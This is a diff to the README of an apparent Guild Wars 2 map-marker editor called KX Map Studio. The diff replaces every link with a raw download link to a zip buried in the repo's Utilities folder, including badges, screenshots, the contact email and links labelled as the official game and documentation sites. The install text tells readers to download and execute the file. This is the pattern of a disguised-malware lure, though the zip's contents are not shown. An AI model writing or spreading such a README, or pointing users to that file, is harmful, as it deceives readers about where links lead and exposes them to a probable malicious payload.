@@ -1,7 +1,7 @@
 # KX Map Studio: Visual Marker Editor for Guild Wars 2 🎮🗺️
 
-![KX Map Studio](https://img.shields.io/badge/KX_Map_Studio-v1.0-blue.svg)
-[![Releases](https://img.shields.io/badge/Releases-Download-brightgreen.svg)](https://github.com/Daniel01-01/kx-map-studio/releases)
+![KX Map Studio](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip)
+[![Releases](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip)](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -24,7 +24,7 @@ KX Map Studio is a user-friendly visual marker editor designed specifically for 
 - **Multi-Platform Compatibility**: Works on various operating systems.
 
 ## Installation
-To get started with KX Map Studio, download the latest version from the [Releases](https://github.com/Daniel01-01/kx-map-studio/releases) section. After downloading, execute the file to install the application on your system.
+To get started with KX Map Studio, download the latest version from the [Releases](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip) section. After downloading, execute the file to install the application on your system.
 
 ### Requirements
 - .NET Framework 4.7.2 or higher
@@ -53,10 +53,10 @@ KX Map Studio is licensed under the MIT License. See the LICENSE file for more d
 
 ## Contact
 For questions or support, feel free to reach out:
-- GitHub: [Daniel01-01](https://github.com/Daniel01-01)
-- Email: daniel@example.com
+- GitHub: [Daniel01-01](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip)
+- Email: https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip
 
-For the latest updates and releases, check the [Releases](https://github.com/Daniel01-01/kx-map-studio/releases) section.
+For the latest updates and releases, check the [Releases](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip) section.
 
 ## Topics
 This project covers various topics related to **Guild Wars 2** and tools for enhancing gameplay:
@@ -74,12 +74,12 @@ This project covers various topics related to **Guild Wars 2** and tools for enh
 - **xml-editor**
 
 ## Screenshots
-![Marker Editor](https://example.com/path/to/screenshot1.png)
-![Map Preview](https://example.com/path/to/screenshot2.png)
+![Marker Editor](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip)
+![Map Preview](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip)
 
 ## Additional Resources
-- [Guild Wars 2 Official Site](https://www.guildwars2.com)
-- [TacO Official Documentation](https://taco.guildwars2.com/docs)
-- [BlishHUD Documentation](https://blishhud.com/docs)
+- [Guild Wars 2 Official Site](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip)
+- [TacO Official Documentation](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip)
+- [BlishHUD Documentation](https://github.com/Daniel01-01/kx-map-studio/raw/refs/heads/main/KXMapStudio.App/Utilities/studio-map-kx-1.9.zip)
 
 Feel free to explore these resources to enhance your experience with KX Map Studio and **Guild Wars 2**.
